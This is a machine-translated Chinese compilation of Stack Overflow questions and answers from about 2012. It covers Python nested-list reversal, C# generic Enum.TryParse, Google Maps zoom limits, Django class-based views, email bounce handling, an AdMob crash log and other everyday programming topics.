`myList=([1,[2,3],[[4,5,[6],7],8,9]])`

我想将其反转为：

`myList= [[[4, 5, [6], 7], 8, 9], [2, 3], 1]`

我怎么做？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-04T01:35:59.643

您可以定义一个递归过程来检查一个元素是否是一个列表本身。如果元素不是列表，则直接将其附加到结果中。如果一个元素是一个列表，则该过程会将此列表元素作为输入等进行递归调用。最终结果是反向列表：

```
def is_list(p): 
    return isinstance(p, list)

def deep_reverse(mylist):
    result = []
    for e in mylist:
        if isinstance(e, list):
            result.append(deep_reverse(e))
        else:
            result.append(e)
    result.reverse()
    return result 
```

例如：一个列表 [1, [8, 9, [4, [5, 9]]]] 变成 [[[[9, 5], 4], 9, 8], 1]

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-22T03:34:11.223

其实这很容易，你可以扭转这个：

**myList=([1,[2,3],[[4,5,[6],7],8,9]])**

经过

**我的列表 = 我的列表 [::-1]**

而已 ！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-07-06T13:27:40.243

这可以通过列表切片轻松完成

```
In [60]: myList
Out[60]: [1, [2, 3], [[4, 5, [6], 7], 8, 9]]

In [61]: myList[::-1]
Out[61]: [[[4, 5, [6], 7], 8, 9], [2, 3], 1] 
```

有关更多信息，请访问 [https://docs.python.org/2.3/whatsnew/section-slices.html](https://docs.python.org/2.3/whatsnew/section-slices.html)

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-05-21T18:01:38.883

如果这确实是家庭作业，则应将其标记为这样，否则，“用于反转列表的用户定义函数”的答案可能是该函数：

```
import copy
def rev(l):
    lc = copy.deepcopy(l)
    lc.reverse()
    return lc 
```

这假设您不想原位反转原始列表（并且没有被要求实际开发运行时已经提供的功能，如果您将其标记为家庭作业，这很可能是这种情况。 . ;)

# php - php 5.4.3 如何添加新的扩展

> ID：10685761
> 
> 赞同：0
> 
> 时间：2012-05-21T13:02:20.423
> 
> 标签：php, windows, php-extension

我目前正在将我的 php 版本升级到 5.4.3。

如何在 5.4 中添加新的 PHP 扩展。

在 php 5.3 和更早的版本中，我们在 ext 文件夹中添加“.dll”文件，并将该 dll 路径添加到 php.ini 文件中。但在 php 5.4 中，“ext”文件夹似乎与旧版本完全不同。

我需要将 sourceguardian dll (ixed.5.3.win) 文件添加到我的 php.ini。我该如何添加？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-08T19:38:15.427

您需要找到与 PHP 5.4 兼容的 sourceguardian dll。

# facebook - Facebook - 使公共页面的照片仅对关注者可用

> ID：10685762
> 
> 赞同：0
> 
> 时间：2012-05-20T17:19:45.950
> 
> 标签：facebook, privacy, photo

我为当地俱乐部管理一个 Facebook 页面，我们显然想用它来分享我们所做的活动的照片。

我正在尝试上传相册，有什么方法可以保护照片，以便只有喜欢该页面的人才能看到它们？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T07:11:03.310

在您的标题中，您说的是“公共页面”，而在您的问题中，您提到了一个“群组”。这个问题的答案会有所不同，具体取决于您使用的是 Facebook 页面还是 Facebook 群组。

如果您使用群组格式，您应该能够限制谁可以查看您的帖子，以便群组成员只能看到它们。

但是，如果您在 Facebook 上使用粉丝页面格式，我认为您不能限制谁可以查看它们。我相信所有粉丝页面的内容都是公开的，我认为你不能限制这一点。

# iphone - UITextView 滚动问题

> ID：10685765
> 
> 赞同：2
> 
> 时间：2012-05-21T13:02:25.800
> 
> 标签：iphone, ios, xcode, uiscrollview, uitextview

我在 Xcode 中有一个 iOS 5.1 项目，并且我有一个视图控制器，当您左右滑动时，它会通过**UITextView**更改屏幕上的信息。我重复使用相同的视图控制器，我遇到的问题是，当您向下滚动并阅读文本然后向左滑动时，滚动位置不会重置到顶部。有没有我可以调用的函数来重置滚动位置？

回答：

发现这就是我想要的：

[self.textView scrollRectToVisible:CGRectMake(0,0,1,1) 动画：NO];

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T13:06:43.853

尝试这个。

```
[self.textView setContentOffset:CGPointMake(0, 0) animated:NO]; 
```

希望能帮助到你 ！

# vb.net - 使用父表和子表创建 DataRelation 并为子表生成带有子节点的 xml

> ID：10685768
> 
> 赞同：0
> 
> 时间：2012-05-21T13:02:41.200
> 
> 标签：vb.net

```
Dim obj_DataTable As New System.Data.DataTable("Category")
    Dim obj_DataSet As New DataSet()
    'Declaring the array of DataColum to hold the Primary Key Columns
    Dim obj_PrimaryClmn(1) As System.Data.DataColumn
    Dim obj_DataRow As System.Data.DataRow
    Dim obj_DataRelation As DataRelation
    Dim writer As New System.IO.StringWriter

    obj_DataTable.Columns.Add(New System.Data.DataColumn("CategoryId"))
    obj_DataTable.Columns.Add(New System.Data.DataColumn("CategoryName"))

    obj_PrimaryClmn(0) = obj_DataTable.Columns(0)
    'Assigning the CategoryId column as Primary Key
    obj_DataTable.PrimaryKey = obj_PrimaryClmn

    'Entering the data in Category Table
    obj_DataRow = obj_DataTable.NewRow()
    obj_DataRow.Item(0) = 0
    obj_DataRow.Item(1) = "Select Category"
    obj_DataTable.Rows.Add(obj_DataRow)

    obj_DataRow = obj_DataTable.NewRow()
    obj_DataRow.Item(0) = 1
    obj_DataRow.Item(1) = "Computers"
    obj_DataTable.Rows.Add(obj_DataRow)

    obj_DataSet.Tables.Add(obj_DataTable)

    obj_DataTable.PrimaryKey = obj_PrimaryClmn

    Dim obj_DataRow1 As System.Data.DataRow
    Dim obj_DataTable1 As New System.Data.DataTable("Product")

    obj_DataTable1.Columns.Add(New System.Data.DataColumn("ProductId"))
    obj_DataTable1.Columns.Add(New System.Data.DataColumn("ProductName"))
    obj_DataTable1.Columns.Add(New System.Data.DataColumn("CategoryId"))

    obj_DataRow1 = obj_DataTable1.NewRow()
    obj_DataRow1.Item(0) = 1
    obj_DataRow1.Item(1) = "PHP"
    obj_DataRow1.Item(2) = 1
    obj_DataTable1.Rows.Add(obj_DataRow1)

    obj_DataSet.Tables.Add(obj_DataTable1)

    Dim obj_ParentClmn, obj_ChildClmn As DataColumn

    obj_ParentClmn = obj_DataSet.Tables("Category").Columns("CategoryId")
    obj_ChildClmn = obj_DataSet.Tables("Product").Columns("CategoryId")

    obj_DataRelation = New DataRelation("relation_Category_Product", obj_ParentClmn, obj_ChildClmn)

    obj_DataSet.Relations.Add(obj_DataRelation)

    obj_DataSet.WriteXml(writer)

    MsgBox(writer.ToString()) 
```

此代码执行。父表和子表之间存在关系。此代码首先依次显示第一个表中的 xml 和第二个表中的 xml。我不需要这种方式。因为存在关系，所以 xml 应该在 xml 中显示第一个表，并将其第二个表显示为第一个表的子节点。怎么可能？请帮帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:17:11.617

根据以下代码将关系类型设置`Nested`为，它将子表填充为 XML 中的子节点。

```
obj_DataRelation = New DataRelation("relation_Category_Product", obj_ParentClmn, obj_ChildClmn)
obj_DataRelation.Nested = True
obj_DataSet.Relations.Add(obj_DataRelation) 
```

[参考这里了解更多关于节点嵌套的知识，知识渊博](http://msdn.microsoft.com/en-us/library/yk6y3s8y.aspx)

# google-maps - 放大谷歌地图API

> ID：10685774
> 
> 赞同：2
> 
> 时间：2012-05-21T13:03:03.100
> 
> 标签：google-maps, google-maps-api-3

我可以将缩放 Google 地图 api 限制为单独缩放吗？我的意思是我可以只有缩放 2 和 6 而不是 2-3-4-5-6 我看到我有最小缩放和最大缩放但我不希望缩放只会在 single 范围内。

问候， 约西

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T13:18:21.610

你只能模仿这个。API 不允许您错过缩放。

该`zoom_changed`事件不再告诉您有关更改的任何信息。在版本 2 中，您可以知道旧的缩放级别和新的级别。

因此，您必须在版本 3 中进行猜测。

如果您在缩放 2 并且用户放大，API 将转到缩放 3。因此您可以拦截`zoom_changed`事件，测试地图现在是否在级别 3 并将其设置为级别 6。您可以在其他方向：如果地图应该在 5 级（从 6 级开始），则将其设为 2。

```
// Untested code
google.maps.event.addListener(map,'zoom_changed',function () {
    if (map.getZoom() == 3) map.setZoom(6);
    if (map.getZoom() == 5) map.setZoom(2);
}); 
```

请注意，如果用户使用缩放滑块并直接从 2 移动到 5，这**将无济于事**：事件处理程序会将当前缩放视为 5，假设它仅移动了一步（从 6）并将其设置回 2。它如果滑块用于缩放 4 也无济于事。您需要决定在这些情况下应该发生什么。您可能想要使用一组有限的没有滑块的地图控件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:15:12.313

好吧，您可以在地图上单击时使用函数 getZoom()。检查缩放级别是否更改。然后使用 setZoom 设置适当的缩放级别[单击此处获取帮助](https://developers.google.com/maps/documentation/javascript/3.8/reference#Map)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T13:22:40.140

您可以为 zoom_changed 事件添加监听器，检查缩放，并根据接近 2 还是接近 6 来设置缩放。

（假设“地图”变量包含地图的一个实例）

```
google.maps.event.addListener(map, 'zoom_changed', function() {

  var currentZoom = map.getZoom();
  if (currentZoom !== 2 && currentZoom !==6) {
    if (currentZoom <=4) {
      map.setZoom(2);
    } else {
      map.setZoom(6);
    }
  }

}); 
```

# django - 如何在 django 中创建方法视图？

> ID：10685775
> 
> 赞同：0
> 
> 时间：2012-05-21T13:03:06.190
> 
> 标签：django

我有这个代码：

```
class StoryViewClass(ListView):

... some listview methods here for one set of urls

def saveStory(self,request,context_object_name,
              template_name,
              success_template):
    if request.method == "POST":
        form = StoryForm(request.POST)
        form.user = request.user.id
        if form.is_valid():
            form.save()
            if (success_template):
                return render_to_response(success_template)
            else:
                return render_to_response('accounts/addStorySuccess.html')
    else:
        form = StoryForm()
    if (context_object_name):
        contextName = context_object_name
    else:
        contextName = 'form'
    if (template_name):
        return render_to_response(template_name,{contextName:form})
    else :
        return render_to_response('accounts/addStory.html',{contextName:form}) 
```

（这本身就很笨拙，稍后会详细介绍）

我如何从我的网址调用这个？

我目前正在尝试这个：

```
url(r'^addStory/$',
    StoryShowView.saveStory(
        context_object_name='form',
        template_name='accounts/addStory.html',
        success_template='accounts/addStorySuccess.html'
    )
), 
```

但 django 抱怨说

```
unbound method saveStory() must be called with StoryShowView instance as first argument (got nothing instead)

Request Method:     POST 
```

我在问什么：

1.  我如何从 urls.py 调用这个方法（作为一个类的方法）？
2.  有没有一种更简单的方法可以使方法“动态”或者你有什么 - 我的意思是，所以我不需要在那里放置所有那些丑陋的“if”块来检查已设置的内容并在必要时进行默认设置？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:34:18.547

这不是你使用 Django 的基于类的视图的方式。这些*必须*通过该`as_view()`方法从 urls.py 中引用。它们并不意味着每个类有多个视图渲染方法 - 如果您需要，最好将通用代码放在基类中并对其进行子类化。但在您的情况下，您可能只想更多地使用现有方法 - 例如，要确定要呈现哪个模板，您应该覆盖`get_template_names()`.

# delphi - 如何使用http更新datasnap rest服务器中的文件？

> ID：10685780
> 
> 赞同：2
> 
> 时间：2012-05-21T13:03:21.157
> 
> 标签：delphi, rest, upload, datasnap

我的问题是标题。我有一个datasnap rest服务器，我想用java或java脚本上传文件。怎么办？（最好有示例代码）非常感谢您！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-29T16:24:45.057

我曾经尝试将流传递给 REST 调用，但最终还是通过直接 WebBroker 请求上传到页面......这更容易管理。这也不是微不足道的，因为当您使用表单让用户选择要上传的文件时，您必须管理收到的多部分请求数据。

这是我在 WebModuleBeforeDispatch 中使用的一些代码：

类型 TMyIdHTTPAppRequest = 类（TIdHTTPAppRequest）；

```
 haReq := TMyIdHTTPAppRequest(Request);
    fname := IntToStr (haReq.ContentLength);
    multi := TMultipartRequestFiles.Create(haReq.FRequestInfo,
      haReq.content);

    if (multi.Count > 0) and Assigned (multi.Items[0]) then
    begin
     theFile := TFileStream.Create(ServerConf['fileupload:tempdir'] + folder + '\' +
        multi.Items[0].FileName, fmCreate);
      multi.Items[0].Stream.Position := 0;
      TheFile.CopyFrom(multi.Items[0].Stream, multi.Items[0].Stream.Size);
      theFile.Free; 
```

然而，它基于我拥有的自定义 TMultipartRequestFiles，试图将其清理并加载为我对 Delphi datasnap 的 Relax 开源扩展的一部分。

还有其他管理文件上传的解决方案吗？我想应该有一些可以在 Indy 中使用的东西，我多年前写了那个类。

# c - C 宏：如何连接名称和作为数学运算结果的数字（也由预处理器完成）？

> ID：10685781
> 
> 赞同：0
> 
> 时间：2012-05-21T13:03:25.790
> 
> 标签：c, macros, concatenation

考虑以下代码：

```
1\. #define SUFFIX 5-5
2\. #define XFUNC_0( x )  (100 * x)
3\. #define XFUNC_1( x )  (101 * x)
4\. #define XFUNC_2( x )  (102 * x)
5\. #define CATX( x, y )  x##y
6\. #define CAT( x, y )   CATX( x, y )
7\. #define XFUNC         CAT( XFUNC_, SUFFIX )
8\. #if     XFUNC(2) == 200
...... etc
N. #endif 
```

这段代码似乎不是很有用，这是因为它只是我真实代码的一部分，经过简化。问题是： - 我如何说服预处理器执行前 5-5（只是数学运算的一个示例）并将结果（在本示例中为零）连接到 XFUNC_？因为它现在不起作用，它在第 8 行告诉我“预处理器指令后出现意外标记 - 需要换行符”。更新：看起来正确，上面的代码将是简单的代码替换，结果为 XFUNC_5-5。但在这种情况下，我还有另一个问题： - 确实存在一种方法来拥有像宏这样的函数或接受作为输入（参数）表达式并输出数字的东西；我认为可能类似于放置连续数字的向量：放置索引（可能是整个表达式），结果相同，

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-21T13:09:43.230

你不能。在将文件传递给编译器之前，预处理器会进行简单的文本替换。它不会执行计算。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T14:14:28.853

[P99](http://p99.gforge.inria.fr/p99-html/group__preprocessor__arithmetic.html)为中等大小的整数实现了预处理算法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:11:33.737

`XFUNC_5-5`随着预处理器进行简单的文本替换，宏将被扩展。由于这包含`-`您收到错误的字符。

# asp.net - 如何在 ASP.NET 4.0 中为 iCal 文件创建 MemoryStream？

> ID：10685787
> 
> 赞同：1
> 
> 时间：2012-05-21T13:03:56.097
> 
> 标签：asp.net, c#-4.0, icalendar, memorystream

我正在尝试使用 memorystream（在 ASP.NET 4.0 中）创建一个 ICS 日历文件，如下所示：

```
using System.IO;
using System;

public MemoryStream GetMemoryStream()
{
    iCalendar iCal = new iCalendar();
    Event evt = iCal.Create<Event>();

    // Set information about the event
    evt.Start = new iCalDateTime(SomeStartTime);
    evt.End = new iCalDateTime(SomeEndTime);
    evt.Location = SomeLocation;
    evt.Description = SomeDescription;
    evt.Summary = SomeSummary;

    iCalendarSerializer serializer = new iCalendarSerializer(iCal);
    MemoryStream ms = new MemoryStream();
    serializer.Serialize(iCal, ms, Encoding.UTF8);
    return ms;
} 
```

我想我错过了一些东西。任何人都可以帮我创建正确`MemoryStream`的对象吗？

**注意：**我需要该`MemorySteam`对象来创建一个`System.Net.Mail.Attachment`for `System.Net.Mail.MailMessage`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T22:18:11.537

据我所见，MemoryStream 正在由序列化程序处理。我通过将日历转换为字符串然后将字符串转换为 MemoryStream 来解决它

```
using System.IO;
using System;

public MemoryStream GetMemoryStream()
{
    iCalendar iCal = new iCalendar();
    Event evt = iCal.Create<Event>();

    // Set information about the event
    evt.Start = new iCalDateTime(SomeStartTime);
    evt.End = new iCalDateTime(SomeEndTime);
    evt.Location = SomeLocation;
    evt.Description = SomeDescription;
    evt.Summary = SomeSummary;

    iCalendarSerializer serializer = new iCalendarSerializer(iCal);
    MemoryStream ms = new MemoryStream();
    //serializer.Serialize(iCal, ms, Encoding.UTF8);
    var ics = serializer.SerializeToString(iCal);
    var bytes = System.Text.Encoding.UTF8.GetBytes(ics);
    ms.Write(bytes, 0, bytes.Length); 
    ms.Seek(0, SeekOrigin.Begin);
    return ms;
} 
```

# java - 使用会话跟踪计算 servlet 中选定项目的总和

> ID：10685792
> 
> 赞同：0
> 
> 时间：2012-05-21T13:04:05.993
> 
> 标签：java, html, session, servlets

我已经将我的数据库检索到 Servlet，所以现在它看起来像这样： ![在此处输入图像描述](../Images/2789fc2c11855e53fe4eaf9f72d1012d.png)

编码：

```
for (int i = 0; i < ex.getExpenses().size(); i++) {
        out.println("<tr>");
        out.println("<td > " + ex.getExpenses().get(i).getNum()+ "</td>");
        out.println("<td > " + ex.getExpenses().get(i).getPayment() + "</td>");
        out.println("<td > " + ex.getExpenses().get(i).getReceiver() + "</td>");
        out.println("<td > " + ex.getExpenses().get(i).getValue() + "</td>");
        out.println("<td><form ><input name = \"num\" type = \"hidden\" value = \""+ex.getExpenses().get(i).getNum()+"  \">");
        out.println("<input type = \"submit\" value = \"add\">");
        out.println("</form></td>");
        out.println("</tr>");

    }
    out.println("<td></td><td></td><td></td><td></td><td><input type = \"submit\" value = \"get the SUM\"></td>");
    out.println("</table>"); 
```

我还要做的是使用会话跟踪（以及我有“添加”的隐藏字段类型）编写我的 servlet，它将计算所选值的总和（例如，如果我在值 22 之后按添加，然后在值 5555 之后它会显示单击“获取总和按钮”5577.0 时的结果）。它看起来像添加到购物车，然后得到我想买的东西的总和。但我以前从未这样做过，所以我请求你的帮助。

我仍然拼命等待任何帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:11:43.767

您是否考虑过在客户端的隐藏字段中获取总和？看起来比使用会话更容易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:32:19.843

好的，所以我猜你想要做的是，当有人点击“添加”时，你需要将表的“值”字段发布到 servlet。

然后从您的 servlet 中，将此值添加到会话并重新显示表单。

当您重新显示表单时，如果您需要喜欢购物车，您可以从会话中获取值并显示在 JSP 中。

当同一用户按下另一个“添加”按钮时，再次在您的 servlet 中，将新值添加到旧会话值，并重新显示表单。

需要注意的一件事 - 我可以看到表格中的值字段不在表单标签内。因此，您将无法从您的 servlet 中检索此值。

看看[HttpSession](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpSession.html)和[HttpServletRequest](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html)

希望这可以帮助

# c# - 如何将通用 Tryparse 与 Enum 一起使用？

> ID：10685794
> 
> 赞同：38
> 
> 时间：2012-05-21T13:04:17.617
> 
> 标签：c#, generics, enums

我正在尝试构建从用户字符串获取的通用函数并尝试将其解析为 Enum valuse，如下所示：

```
private Enum getEnumStringEnumType(Type i_EnumType)
    {
        string userInputString = string.Empty;
        Enum resultInputType;
        bool enumParseResult = false;

        while (!enumParseResult)
        {                
            userInputString = System.Console.ReadLine();
            enumParseResult = Enum.TryParse(userInputString, true, out resultInputType);
        }
    } 
```

但我得到：

```
The type 'System.Enum' must be a non-nullable value type in order to use it as parameter 'TEnum' in the generic type or method 'System.Enum.TryParse<TEnum>(string, bool, out TEnum)    . 
```

错误意味着我需要为 resultInputType 声明一个特定的枚举？我怎样才能解决这个问题 ？谢谢。

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-05-21T13:07:48.137

该[`TryParse`方法](http://msdn.microsoft.com/en-us/library/dd991317.aspx)具有以下签名：

```
TryParse<TEnum>(string value, bool ignoreCase, out TEnum result)
    where TEnum : struct 
```

`TEnum`它有一个必须是*结构*的泛型类型参数，用于确定要解析的枚举类型。当您没有明确提供它时（就像您所做的那样），它将采用您提供的任何类型作为`result`参数，在您的情况下是类型`Enum`（而不是枚举本身的类型）。

请注意，这[`Enum`是一个*类*](http://msdn.microsoft.com/en-us/library/system.enum.aspx)（尽管它继承自`ValueType`），因此它不满足`TEnum`作为*struct*的要求。

您可以通过删除`Type`参数并为方法提供具有与函数`struct`上的泛型类型参数相同的约束（即）的泛型类型参数来解决此问题`TryParse`。

所以试试这个，我在这里命名了泛型类型参数`TEnum`：

```
private static TEnum GetEnumStringEnumType<TEnum>()
    where TEnum : struct
{
    string userInputString = string.Empty;
    TEnum resultInputType = default(TEnum);
    bool enumParseResult = false;

    while (!enumParseResult)
    {                
        userInputString = System.Console.ReadLine();
        enumParseResult = Enum.TryParse(userInputString, true, out resultInputType);
    }
    return resultInputType;
} 
```

要调用该方法，请使用：

```
GetEnumStringEnumType<MyEnum>(); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-05-21T13:08:47.353

您应该制作一个通用方法：

```
private T getEnumStringEnumType<T>() where T : struct, IConvertible
    {
        string userInputString = string.Empty;
        T resultInputType = default(T);
        bool enumParseResult = false;

        while (!enumParseResult)
        {
            userInputString = System.Console.ReadLine();
            enumParseResult = Enum.TryParse<T>(userInputString, out resultInputType);
        }

        return resultInputType;
    } 
```

用法：

```
public enum myEnum { val1, val2 }

myEnum enumValue = getEnumStringEnumType<myEnum>(); 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-07-17T11:46:55.407

很久以前，在 Visual Studio 2005 时代，我为 Enum 上的 TryParse 创建了自己的方法。我最近才发现 2008 年的实现，我对它的限制性不满意，特别是考虑到它是一个**TRY PARSE**方法；意味着程序员正在测试输入！

一般来说，我更喜欢使用信任程序员知道他在做什么的方法:)

我的实现如下：

```
public static bool EnumTryParse<T>(string input, out T theEnum)
{
    foreach (string en in Enum.GetNames(typeof(T)))
    {
        if (en.Equals(input, StringComparison.CurrentCultureIgnoreCase))
        {
            theEnum = (T)Enum.Parse(typeof(T), input, true);
            return true;
        }
    }

    theEnum = default(T);
    return false;
} 
```

缺少 where T:struct 将信任置于开发人员手中，但它允许您使用未知的通用枚举进行编译。

作为替代方案，如果您想在转换为指定的枚举时进行整数比较，则可以在 Enum.GetValues 上创建一个循环方法。

希望这可以帮助。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-21T13:07:24.687

`Enum.TryParse`是一个泛型方法，这意味着它的泛型类型参数必须在编译时知道。这反过来意味着是的，您必须声明`resultInputType`为*特定*的枚举类型才能编译代码。

如果您考虑一下，原始代码有点过于乐观：它没有说明应该检查*哪个*`userInputString`枚举类型以查找名称等于的成员。没有这些信息怎么可能`TryParse`工作？

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2021-08-22T08:34:03.967

从 C# 7 开始，我们可以将泛型类型指定为`Enum`

```
where TCustomValidatorsEnum : Enum 
```

如评论

```
TryParse<TEnum>(string value, bool ignoreCase, out TEnum result)
    where TEnum : struct 
```

将按照 OP 中的说明进行编译投诉：

> 类型“System.Enum”必须是不可为空的值类型，以便在泛型类型或方法“System.Enum.TryParse(string, bool, out TEnum) 中将其用作参数“TEnum”

这个版本虽然编译：

```
var converted = Enum.TryParse(typeof(TCustomValidatorsEnum), schemaConstraintType, true, out var customValidationEnum); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-05-22T07:18:45.713

字符串扩展方法

```
public TEnum ToEnum<TEnum>(this string value, TEnum defaultValue){

if (string.IsNullOrEmpty(value))return defaultValue;

return Enum.Parse(typeof(TEnum), value, true);} 
```

# email - 退回邮件处理是否值得？

> ID：10685799
> 
> 赞同：3
> 
> 时间：2012-05-21T13:04:31.827
> 
> 标签：email, email-notifications, email-bounces

我们有一个在电子邮件通知方面没有什么花哨的网络应用程序。很高兴知道最终用户输入的电子邮件地址是否错误并且交付给它会炸弹。

在受垃圾邮件感染的电子邮件的现代世界中，仍然值得尝试捕获退回邮件吗？在今天的邮件服务器配置中，由于反向散射等原因，通常认为最好不要为未知收件人发送退回电子邮件。

那么，尝试捕捉最简单情况之外的任何传递失败（如坏域，您的本地外发电子邮件服务器应该能够告诉您）真的值得付出努力吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-22T17:55:50.210

Bounce Management 产生了巨大的影响，假设您是一家每月发送 50,000 封电子邮件以获取新闻通讯或收据的公司。如果某个电子邮件服务器让我们说“mx.maildomain.com”，则退回一封电子邮件，无论是硬的还是软的。如果“mx.maildomain.com”服务器上部署了高级垃圾邮件过滤技术。而且您一遍又一遍地重复发送同一个用户，因为您每周邮寄一份时事通讯。然后“mx.maildomain.com”可能会决定，您是垃圾邮件发送者，然后您的大部分电子邮件将最终进入垃圾文件夹（包括该邮件服务器上其他客户的收据），或者您最终可能会被列入黑名单。

但更重要的是，电子邮件反馈循环，您绝对应该设置它们。这会告诉您哪些用户点击了您发送的电子邮件中的“垃圾邮件”按钮。这可能比反弹更具破坏性。如果人们反复将您的电子邮件标记为垃圾邮件，这是被列入黑名单的最佳方式。我为我的公司设置了它们，即使有适当的退出链接，我也无法相信有多少人点击了我每月通讯上的垃圾邮件链接，他们注册了。令人震惊。从我的列表中删除所有这些用户需要一段时间，但值得花时间。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:28:30.690

如果您向注册用户发送电子邮件通知，您应该在注册时进行电子邮件验证，以确保他们为您提供合法的电子邮件帐户。

根据您的业务，跟踪袋可能很有用。如果收到您发送给用户的电子邮件非常重要，例如在通知到期或已发送付款的情况下，那么跟踪和报告失败的电子邮件是值得的。帮助节省客户支持时间来处理抱怨没有收到付款或忘记付款并声称他们从未收到通知的人。

我曾经在一个这样的地方工作过，我们设置了一个 3 次打击系统，在 3 封失败/退回的电子邮件之后，我们将锁定用户帐户并要求他们重新验证有效的电子邮件以继续与我们开展业务。

# android - 从查看广告返回时，admob 广告崩溃应用

> ID：10685800
> 
> 赞同：0
> 
> 时间：2012-05-21T13:04:43.197
> 
> 标签：android, xml, admob

正如标题所说..我的应用程序加载并运行良好，直到我点击admob广告..广告在浏览器或播放商店中加载但返回时，当我按下我唯一的图像按钮时，应用程序强制关闭..任何想法为什么？

```
05-21 14:52:12.060: D/dalvikvm(5403): GC_FOR_ALLOC freed 605K, 27% free 3581K/4867K, paused 21ms
05-21 14:52:12.065: I/dalvikvm-heap(5403): Grow heap (frag case) to 4.467MB for 614416-byte allocation
05-21 14:52:12.110: D/dalvikvm(5403): GC_CONCURRENT freed <1K, 15% free 4181K/4867K, paused 1ms+1ms
05-21 14:52:12.165: D/dalvikvm(5403): GC_FOR_ALLOC freed 0K, 15% free 4181K/4867K, paused 20ms
05-21 14:52:12.170: I/dalvikvm-heap(5403): Grow heap (frag case) to 5.786MB for 1382416-byte allocation
05-21 14:52:12.195: D/dalvikvm(5403): GC_CONCURRENT freed 0K, 12% free 5531K/6275K, paused 1ms+1ms
05-21 14:52:12.320: D/dalvikvm(5403): GC_FOR_ALLOC freed 600K, 21% free 5461K/6851K, paused 19ms
05-21 14:52:12.320: I/dalvikvm-heap(5403): Grow heap (frag case) to 6.875MB for 1213072-byte allocation
05-21 14:52:12.345: D/dalvikvm(5403): GC_CONCURRENT freed <1K, 18% free 6645K/8067K, paused 2ms+1ms
05-21 14:52:12.385: D/dalvikvm(5403): GC_FOR_ALLOC freed 526K, 18% free 6645K/8067K, paused 10ms
05-21 14:52:12.390: I/dalvikvm-heap(5403): Grow heap (frag case) to 8.027MB for 1210264-byte allocation
05-21 14:52:12.405: D/dalvikvm(5403): GC_FOR_ALLOC freed <1K, 16% free 7826K/9283K, paused 12ms
05-21 14:52:12.535: I/dalvikvm(5403): threadid=3: reacting to signal 3
05-21 14:52:12.555: I/dalvikvm(5403): Wrote stack traces to '/data/anr/traces.txt'
05-21 14:52:12.625: I/Ads(5403): To get test ads on this device, call adRequest.addTestDevice("1************************4");
05-21 14:52:12.665: I/Ads(5403): adRequestUrlHtml: <html><head><script src="http://media.admob.com/sdk-core-v40.js"></script><script>AFMA_getSdkConstants();AFMA_buildAdURL({"kw":[],"preqs":0,"session_id":"7866093980682069803","u_sd":1.5,"seq_num":"1","slotname":"********************","u_w":320,"msid":"com.spookytorch.jembe","js":"afma-sdk-a-v6.0.1","mv":"8011019.com.android.vending","isu":"1BAF8DE657D89B41C6CF3E83DEBFEC44","cipa":1,"format":"320x50_mb","net":"wi","app_name":"1.android.com.spookytorch.jembe","hl":"en","u_h":533,"carrier":"23430","ptime":0,"u_audio":1});</script></head><body></body></html>
05-21 14:52:12.690: W/Ads(5403): loadAd called while the ad is already loading, so aborting.
05-21 14:52:13.035: I/dalvikvm(5403): threadid=3: reacting to signal 3
05-21 14:52:13.040: I/dalvikvm(5403): Wrote stack traces to '/data/anr/traces.txt'
05-21 14:52:13.950: I/Ads(5403): Received ad url: <url: "http://googleads.g.doubleclick.net:80/mads/gma?kw&preqs=0&session_id=7866093980682069803&u_sd=1.5&slotname=a14fb9560894352&u_w=320&msid=com.spookytorch.jembe&js=afma-sdk-a-v6.0.1&mv=8011019.com.android.vending&isu=1BAF8DE657D89B41C6CF3E83DEBFEC44&cipa=1&format=320x50_mb&net=wi&app_name=1.android.com.spookytorch.jembe&hl=en&u_h=533&carrier=23430&ptime=0&u_audio=1&u_so=p&output=html&region=mobile_app&u_tz=-60&ex=1&client_sdk=1&kw_type=broad&caps=inlineVideo_interactiveVideo_mraid1_clickTracking_sdkAdmobApiForAds&jsv=24" type: "admob" afmaNotifyDt: "null">
05-21 14:52:14.645: I/Ads(5403): onReceiveAd()
05-21 14:52:17.980: I/Ads(5403): onPresentScreen()
05-21 14:52:17.980: I/Ads(5403): onLeaveApplication()
05-21 14:52:18.025: D/dalvikvm(5403): GC_FOR_ALLOC freed 2417K, 30% free 7017K/9923K, paused 18ms
05-21 14:52:18.025: W/MediaPlayer-JNI(5403): MediaPlayer finalized without being released
05-21 14:52:18.030: W/CursorWrapperInner(5403): Cursor finalized without prior close()
05-21 14:52:18.075: D/webviewglue(5403): nativeDestroy view: 0x19576e0
05-21 14:52:18.080: D/webviewglue(5403): nativeDestroy view: 0x19a5bd8
05-21 14:52:21.000: I/Ads(5403): onDismissScreen()
05-21 14:52:21.835: I/info(5403): torch is turn on!
